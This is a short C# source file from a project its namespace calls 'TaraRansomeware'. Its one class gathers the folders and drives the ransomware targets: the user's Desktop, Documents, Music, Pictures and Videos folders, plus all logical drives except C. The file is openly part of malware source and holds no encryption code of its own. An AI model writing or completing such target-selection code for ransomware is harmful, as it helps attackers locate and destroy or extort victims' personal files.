using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace TaraRansomeware.Utilities
{
    class RootGenerator
    {
        public static string[] generate()
        {
            List<string> lst = new List<string>();

            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));

            string[] drives = Environment.GetLogicalDrives();
            foreach(var drive in drives)
            {
                if(drive.Contains('C'))
                {
                    continue;
                } else
                {
                    lst.Add(drive);
                }
            }

            return lst.ToArray();
        }
    }
}
